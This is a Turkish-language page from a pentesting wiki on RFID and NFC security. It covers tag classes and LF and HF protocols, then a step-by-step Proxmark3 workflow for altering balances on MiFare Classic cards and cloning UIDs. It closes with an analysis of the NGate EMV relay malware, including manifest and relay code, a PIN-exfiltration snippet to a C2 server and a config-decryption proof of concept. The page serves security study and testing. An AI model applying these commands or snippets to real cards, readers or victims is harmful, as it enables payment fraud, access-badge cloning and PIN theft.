# Pentesting RFID

{{#include ../../banners/hacktricks-training.md}}

## Giriş

**Radyo Frekansı Tanımlama (RFID)**, en popüler kısa-menzilli radyo çözümüdür. Genellikle bir varlığı tanımlayan bilgileri depolamak ve iletmek için kullanılır.

Bir RFID etiket kendi güç kaynağına (**active**) — ör. gömülü bir batarya — dayanabilir veya okuma anteninden alınan radyo dalgalarından **indüklenen akım** ile gücünü alabilir (**passive**).

### Sınıflar

EPCglobal RFID etiketlerini altı kategoriye ayırır. Her kategoriye ait bir etiket, önceki kategoride listelenen tüm yeteneklere sahiptir; bu da geriye dönük uyumluluk sağlar.

- **Class 0** etiketler **passive** etiketlerdir ve **UHF** bandında çalışır. Üretici tarafından fabrikada **preprograms** edilir. Sonuç olarak, belleklerinde depolanan bilgileri **değiştiremezsiniz**.
- **Class 1** etiketler ayrıca **HF** bandında çalışabilir. Ayrıca üretim sonrası **sadece bir kez yazılabilir**. Birçok Class 1 etiketi aldıkları komutların **cyclic redundancy checks** (CRCs) işlemini de yapabilir. CRC'ler, komutların sonundaki birkaç ekstra byte olup hata tespiti için kullanılır.
- **Class 2** etiketler **birden fazla kez yazılabilir**.
- **Class 3** etiketler, mevcut sıcaklık veya etiketin hareketi gibi çevresel parametreleri kaydedebilen **gömülü sensörler** içerebilir. Bu etiketler **semi-passive**dir; çünkü entegre bir **battery** gibi gömülü bir güç kaynağı **vardır**, ancak diğer etiketler veya okuyucular ile kablosuz **haberleşmeyi başlatamazlar**.
- **Class 4** etiketler aynı sınıftaki diğer etiketlerle iletişim başlatabilir; bunlar **active tags**dir.
- **Class 5** etiketler diğer etiketlere **güç sağlayabilir ve önceki tüm tag sınıfları ile iletişim kurabilir**. Class 5 etiketler **RFID readers** olarak da davranabilir.

### RFID Etiketlerinde Depolanan Bilgiler

Bir RFID etiketinin belleği genellikle dört tür veri depolar: etikete bağlı varlığı **tanımlayan** **identification data** (bu veriler banka hesapları gibi kullanıcı tanımlı alanları içerir); varlıkla ilgili **daha fazla detay** sağlayan **supplementary data**; etiketin dahili **yapılandırması** için kullanılan **control data**; ve etiketin **Unique Identifier (UID)** ile üretim, tür ve satıcı bilgilerini içeren **manufacturer data**. İlk iki veri türü tüm ticari etiketlerde bulunurken; son iki tür etikete ve satıcıya bağlı olarak değişebilir.

ISO standardı, etiketin ait olduğu **nesne türünü** gösteren bir kod olan Application Family Identifier (**AFI**) değerini belirtir. ISO tarafından belirtilen bir diğer önemli kayıt ise kullanıcı verilerinin **mantıksal organizasyonunu** tanımlayan Data Storage Format Identifier (**DSFID**) değeridir.

Çoğu RFID **security controls**, her kullanıcı bellek bloğu ve AFI ile DSFID değerlerini içeren özel kayıtlar üzerindeki **read** veya **write** işlemlerini **kısıtlayan** mekanizmalara sahiptir. Bu **lock** **mechanisms**, kontrol belleğinde depolanan verileri kullanır ve satıcı tarafından ön yapılandırılmış **default passwords** içerir; ancak etiket sahiplerinin **custom passwords** yapılandırmasına izin verir.

### Düşük & Yüksek frekans etiketleri karşılaştırması

<figure><img src="../../images/image (983).png" alt=""><figcaption></figcaption></figure>

## Low-Frequency RFID Tags (125kHz)

**Düşük frekanslı etiketler**, genellikle yüksek güvenlik gerektirmeyen sistemlerde kullanılır: bina erişimi, interkom anahtarları, spor salonu üyelik kartları vb. Daha yüksek menzilleri nedeniyle, ücretli otopark uygulamalarında kullanışlıdır: sürücünün kartı okuyucuya yaklaştırmasına gerek yoktur, çünkü daha uzaktan tetiklenir. Aynı zamanda düşük frekanslı etiketler çok ilkel olup düşük veri aktarım hızına sahiptir. Bu nedenle bakiye tutma ve kriptografi gibi karmaşık iki yönlü veri aktarımı uygulamak imkansızdır. Düşük frekanslı etiketler yalnızca kimliklerini (short ID) doğrulama olmadan iletir.

Bu cihazlar **passive** **RFID** teknolojisine dayanır ve genellikle **30 kHz ile 300 kHz** aralığında çalışır; ancak genelde 125 kHz ile 134 kHz arası kullanılır:

- **Long Range** — daha düşük frekans daha yüksek menzile dönüşür. Bazı EM-Marin ve HID okuyucular yaklaşık bir metre mesafeden çalışabilir. Bu tür okuyucular genellikle otoparklarda kullanılır.
- **Primitive protocol** — düşük veri aktarım hızı nedeniyle bu etiketler yalnızca kısa ID'lerini iletebilir. Çoğu durumda veriler doğrulanmaz ve hiçbir şekilde korunmaz. Kart okuyucunun menziline girdiği anda ID iletmeye başlar.
- **Low security** — Bu kartlar kolayca kopyalanabilir veya protokolün ilkel yapısı nedeniyle bir başkasının cebinden bile okunabilir.

**Popüler 125 kHz protokoller:**

- **EM-Marin** — EM4100, EM4102. CIS bölgesinde en popüler protokol. Basitliği ve stabilitesi nedeniyle yaklaşık bir metre uzaklıktan okunabilir.
- **HID Prox II** — HID Global tarafından tanıtılan düşük frekanslı protokol. Bu protokol batı ülkelerinde daha popülerdir. Daha karmaşıktır ve bu protokol için kartlar ve okuyucular nispeten pahalıdır.
- **Indala** — Motorola tarafından tanıtılan ve daha sonra HID tarafından satın alınan çok eski bir düşük frekans protokolü. Önceki iki protokole kıyasla sahada daha az karşılaşma ihtimaliniz vardır çünkü kullanımdan düşmektedir.

Gerçekte çok daha fazla düşük frekanslı protokol vardır. Ancak hepsi fiziksel katmanda aynı modülasyonu kullanır ve bir şekilde yukarıda listelenenlerin varyasyonları olarak kabul edilebilir.

### Saldırı

Bu etiketlere **Flipper Zero** ile saldırabilirsiniz:


{{#ref}}
flipper-zero/fz-125khz-rfid.md
{{#endref}}

## High-Frequency RFID Tags (13.56 MHz)

**Yüksek frekanslı etiketler**, kriptografi, geniş iki yönlü veri aktarımı, kimlik doğrulama gibi daha karmaşık okuyucu-etiket etkileşimleri gerektiğinde kullanılır. Genellikle banka kartlarında, toplu taşıma ve diğer güvenli geçişlerde bulunur.

**13.56 MHz yüksek frekanslı etiketler bir dizi standart ve protokoldür**. Genellikle bunlara [NFC](https://nfc-forum.org/what-is-nfc/about-the-technology/) denir, ancak bu her zaman doğru değildir. Fiziksel ve mantıksal seviyelerde kullanılan temel protokol seti ISO 14443'tür. Üst seviye protokoller ve alternatif standartlar (ISO 19092 gibi) bunun üzerine inşa edilir. Birçok kişi bu teknolojiyi 13.56 MHz frekansında çalışan cihazlar için kullanılan bir terim olan **Near Field Communication (NFC)** olarak adlandırır.

<figure><img src="../../images/image (930).png" alt=""><figcaption></figcaption></figure>

Basitçe söylemek gerekirse, NFC mimarisi şöyle çalışır: iletim protokolü kartları yapan şirket tarafından seçilir ve düşük seviye ISO 14443'e dayanarak uygulanır. Örneğin, NXP kendi yüksek seviye iletim protokolü olan Mifare'ı geliştirdi. Ancak alt seviyede Mifare kartları ISO 14443-A standardına dayanır.

Flipper hem düşük seviye ISO 14443 protokolüyle hem de Mifare Ultralight veri aktarım protokolü ve banka kartlarında kullanılan EMV ile etkileşim kurabilir. Mifare Classic ve NFC NDEF desteği eklemek için çalışıyoruz. NFC'yi oluşturan protokollere ve standartlara ayrıntılı bakış ayrı bir makaleyi hak ediyor; bunu ileride yayınlamayı planlıyoruz.

ISO 14443-A standardına dayanan tüm yüksek frekanslı kartların benzersiz bir çip ID'si vardır. Bu, kartın seri numarası gibi davranır; bir ağ kartının MAC adresi gibidir. **Genellikle UID 4 veya 7 byte uzunluğunda olur**, nadiren **10'a kadar** çıkabilir. UID'ler gizli değildir ve kolayca okunabilir, **bazen kartın üzerine bile basılıdır**.

Birçok erişim kontrol sistemi UID'ye güvenerek **kimlik doğrulama ve erişim izni** verir. Bazen bu, RFID etiketleri **kriptografiyi desteklese bile** gerçekleşir. Böyle bir **kötü kullanım**, güvenlik açısından bunları aptal **125 kHz kartlar** düzeyine indirir. Sanal kartlar (Apple Pay gibi) dinamik UID kullanır, böylece telefon sahipleri ödeme uygulamalarıyla kapıları açmazlar.

- **Low range** — yüksek frekanslı kartlar, okuyucuya yakın tutulmaları gerekecek şekilde tasarlanmıştır. Bu aynı zamanda kartı yetkisiz etkileşimlerden korumaya yardımcı olur. Başardığımız maksimum okuma menzili yaklaşık 15 cm idi ve bu özel yapılmış yüksek menzilli okuyucularla sağlandı.
- **Advanced protocols** — 424 kbps'ye kadar veri transfer hızları, tam teşekküllü iki yönlü veri aktarımı içeren karmaşık protokollere izin verir. Bu da **kriptografi**, veri aktarımı vb. sağlar.
- **High security** — yüksek frekans temassız kartlar akıllı kartlardan hiçbir şekilde eksik değildir. AES gibi kriptografik olarak güçlü algoritmaları destekleyen ve asimetrik kriptografiyi uygulayan kartlar vardır.

### Saldırı

Bu etiketlere **Flipper Zero** ile saldırabilirsiniz:


{{#ref}}
flipper-zero/fz-nfc.md
{{#endref}}

Veya **proxmark** kullanarak:


{{#ref}}
proxmark-3.md
{{#endref}}

### MiFare Classic offline stored-value tampering (broken Crypto1)

Bir sistem bir MiFare Classic kartına doğrudan parasal bakiye depoladığında, Classic'in NXP’nin artık kullanım dışı Crypto1 şifresi kullanması nedeniyle bunu genellikle manipüle edebilirsiniz. Crypto1 yıllardır kırılmıştır; sektör donanımı (ör. Proxmark3) ile sektör anahtarlarının kurtarılmasına ve kart belleğinin tam okuma/yazma işlemlerine izin verir.

Baştan sona iş akışı (soyutlanmış):

1) Dump the original card and recover keys
```bash
# Attempt all built-in Classic key recovery attacks and dump the card
hf mf autopwn
```
Bu genellikle sector keys (A/B) kurtarır ve client dumps folder içinde bir full-card dump oluşturur.

2) value/integrity fields'i belirleyin ve anlayın

- Orijinal karta meşru top-ups uygulayın ve birden fazla dump alın (önce/sonra).
- İki dump üzerinde diff yapın ve bakiye ile herhangi bir integrity field'i temsil eden değişen blok/byte'ları tespit edin.
- Birçok Classic deployment'ı ya native "value block" encoding'ini kullanır ya da kendi checksums'larını oluşturur (e.g., XOR of the balance with another field and a constant). Bakiyeyi değiştirdikten sonra integrity byte'larını buna göre yeniden hesaplayın ve tüm duplicated/complemented alanların tutarlı olduğunu doğrulayın.

3) Değiştirilmiş dump'ı yazılabilir bir “Chinese magic” Classic tag'a yazın
```bash
# Load a modified binary dump onto a UID-changeable Classic tag
hf mf cload -f modified.bin
```
4) Terminaller kartı tanısın diye orijinal UID'yi klonlayın
```bash
# Set the UID on a UID-changeable tag (gen1a/gen2 magic)
hf mf csetuid -u <original_uid>
```
5) Terminallerde kullanım

Kart üzerindeki bakiye ve UID'e güvenen okuyucular manipüle edilmiş kartı kabul eder. Saha gözlemleri birçok dağıtımın bakiyeleri alan genişliğine göre sınırlandırdığını gösteriyor (ör. 16-bit sabit nokta).

Notlar

- Eğer sistem native Classic value blocks kullanıyorsa, formatı hatırlayın: value (4B) + ~value (4B) + value (4B) + block address + ~address. Tüm parçalar eşleşmelidir.
- Basit checksums içeren özel formatlar için, firmware'i tersine çevirmeden bütünlük fonksiyonunu türetmenin en hızlı yolu diferansiyel analizdir.
- Yalnızca UID-değiştirilebilir etiketler ("Chinese magic" gen1a/gen2) block 0/UID yazılmasına izin verir. Normal Classic kartların UID'leri yalnızca okunurdur.

Pratik Proxmark3 komutları için bakınız:


{{#ref}}
proxmark-3.md
{{#endref}}

### Taşınabilir HID MaxiProx 125 kHz Mobil Klonlayıcı Yapımı

Eğer red-team operasyonları sırasında HID Prox® rozetlerini toplamak için **uzun menzilli**, **batarya ile çalışan** bir çözüme ihtiyacınız varsa, duvara monte **HID MaxiProx 5375** okuyucusunu sırt çantasına sığan kendi içinde çalışan bir klonlayıcıya dönüştürebilirsiniz. Tam mekanik ve elektriksel adım adım anlatım burada mevcut:


{{#ref}}
maxiprox-mobile-cloner.md
{{#endref}}

## Android Reader↔HCE Emitter üzerinden NFC/EMV Relay

Classic EMV relay, 2 Android cihazla uygulanabilir: gerçek bir karttan canlı APDU'ları ve PIN'i yakalayan mağdur tarafı okuyucu ve APDU'ları yukarıya ileten terminaldeki saldırgan tarafı HCE emitter. Analiz edilen NGate kiti, meşru Android NFC API'lerini ve gerçek zamanlı ATM nakit çekimleri düzenlemek için basit çerçeveli bir TCP C2'yi kötüye kullanır.

Temel yapı taşları

- Reader-mode app (mağdur): EMV'yi (PAN/expiry/AIDs) ayrıştırmak için NFC reader API'lerini kullanır, AID'e göre şemayı gösterir, PIN ister ve derhal sızdırır.
- Emitter-mode app (ATM tarafı): Host Card Emulation (HCE) uygular, `android:requireDeviceUnlock="false"` ve bir ödeme AID'si ile; `processCommandApdu()` APDU'ları C2'ye iletir ve asgari yanıt döner.
- Wire protocol: uzunluk-önekli çerçeveler, periyodik keepalive; isteğe bağlı TLS.

Android yüzeyi (Manifest/HCE)
```xml
<uses-permission android:name="android.permission.NFC"/>
<uses-permission android:name="android.permission.INTERNET"/>
<service android:name=".nfc.hce.ApduService"
android:permission="android.permission.BIND_NFC_SERVICE"
android:exported="true">
<intent-filter>
<action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
<category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
<meta-data android:name="android.nfc.cardemulation.host_apdu_service"
android:resource="@xml/hce"/>
</service>
```
hce.xml örneği (unlock yok + ödeme AID)
```xml
<host-apdu-service android:requireDeviceUnlock="false"
android:description="relay">
<aid-group android:category="other">
<aid-filter android:name="F001020304050607"/>
</aid-group>
<aid-group android:category="payment">
<aid-filter android:name="F001020304050607"/>
</aid-group>
</host-apdu-service>
```
Şeffaf relay endpoint (HCE)
```java
@Override public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
Log.d("ApduService", "APDU-IN: " + toHex(apdu));
bus.forward(apdu); // send upstream to C2/reader
return new byte[0]; // empty response, pure relay endpoint
}
```
AID'ye göre EMV şeması çıkarımı (örnekler)

- A000000004 → Mastercard
- A000000003 → Visa
- A000000658 → MIR
- A000000333 → UnionPay

PIN toplama deseni (kurban UI)
```java
// Custom keypad publishes when required length (e.g., 4) is reached
if (pin.length() == 4) postDelayed(() -> bus.publish(pin), 100L);
// Network immediately exfiltrates via dedicated opcode
send(OP_PIN_REQ, pin.getBytes(StandardCharsets.UTF_8));
```
Framed C2 (cleartext örneği)

- Client→Server: int32 len | int32 opcode | body
- Server→Client: int32 len | body (opcode payload içinde)
- ~100 MiB'den büyük bodies'i reddet; keepalive ~7s (PING)
```java
// send
out.writeInt(body.length); out.writeInt(op); out.write(body); out.flush();
// recv
int len = in.readInt(); byte[] body = new byte[len]; in.readFully(body);
```
Config concealment: cert-derived XOR

- Yerel kütüphane, uygulama imzalama sertifikasının (DER) SHA‑256'si olarak 32 baytlık bir anahtar türetir.
- C2 yapılandırması assets içinde ASCII‑hex olarak (ör. `assets/____`) bulunur, hex-decoded edilip anahtar ile her 32 baytta bir tekrarlanarak XOR'lanır:
```c
for (size_t i = 0; i < len; i++) pt[i] = ct[i] ^ key[i & 31];
```
Çevrimdışı PoC ile config'i deşifre etme
```bash
# Extract signing cert digest
apksigner verify --print-certs sample.apk
# "Signer #1 certificate SHA-256 digest: <hex>"
```

```python
import pathlib
key = bytes.fromhex("<sha256_of_signing_cert>")
ct  = bytes.fromhex(pathlib.Path("/path/to/assets/____").read_text().strip())
pt  = bytes(c ^ key[i % 32] for i, c in enumerate(ct))
print(pt.decode("utf-8", errors="replace"))
```
Örnek çözümlenmiş alanlar: `host`, `port`, `sharedToken`, `tls`, `mode`, `reader`, `uniqueID`, `ttd`.

Relay zinciri (uçtan uca)

1) Kurban APK'yı yükler, uygulamayı açar → native init assets içinden konfigürasyonu çözer.  
2) Uygulama framed TCP kullanarak C2'ye bağlanır (örn., `91.84.97.13:5653`); keepalive ~7s.  
3) Kurban karta dokunur → reader PAN/expiry/AIDs çıkarır ve CARD_DISCOVERED gönderir.  
4) Kurban PIN girer → keypad PIN_REQ üzerinden yayınlar ve exfiltrates eder; sunucu sadece UI için VALID/INVALID yanıtı döner.  
5) Terminaldeki saldırgan cihazı HCE emitter çalıştırır, APDUs'i ATM'ye iletip cash-out gerçekleştirir.

---

## Referanslar

- [https://blog.flipperzero.one/rfid/](https://blog.flipperzero.one/rfid/)
- [Let's Clone a Cloner – Part 3 (TrustedSec)](https://trustedsec.com/blog/lets-clone-a-cloner-part-3-putting-it-all-together)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [MIFARE security overview (Wikipedia)](https://en.wikipedia.org/wiki/MIFARE#Security)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [Analysis of NGate malware campaign (CERT-PL)](https://cert.pl/en/posts/2025/11/analiza-ngate/)
- [Android apksigner – verify/print-certs](https://developer.android.com/studio/command-line/apksigner)
- [Android Host Card Emulation (HCE) overview](https://developer.android.com/guide/topics/connectivity/nfc/hce)

{{#include ../../banners/hacktricks-training.md}}
